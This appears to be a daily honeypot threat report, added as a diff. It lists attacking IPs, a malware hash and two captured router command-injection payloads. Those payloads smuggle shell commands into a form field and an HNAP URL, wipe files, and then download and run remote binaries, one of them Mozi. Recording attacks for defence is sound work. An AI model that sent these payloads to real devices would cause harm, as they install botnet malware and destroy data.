@@ -1,0 +1,27 @@
+Top 5 IPs for 2024-06-29 :
+
+183.129.178.206
+116.255.209.48
+220.74.58.37
+150.109.197.33
+111.92.191.20
+
+Malware Observed:
+
+
+File name : sshd
+3974a1757c786c61c5cec40d6f3af66aec799459cc51af15dca88ac3c927115d
+https://www.virustotal.com/gui/file/3974a1757c786c61c5cec40d6f3af66aec799459cc51af15dca88ac3c927115d
+
+
+Commands/exploits observed:
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.177.35.32/tajma.mpsl; chmod 777 tajma.mpsl; ./tajma.mpsl tajma.mpsl;rm -rf *mpsl*;
+
+
+
+
+http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://124.255.20.54:57220/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
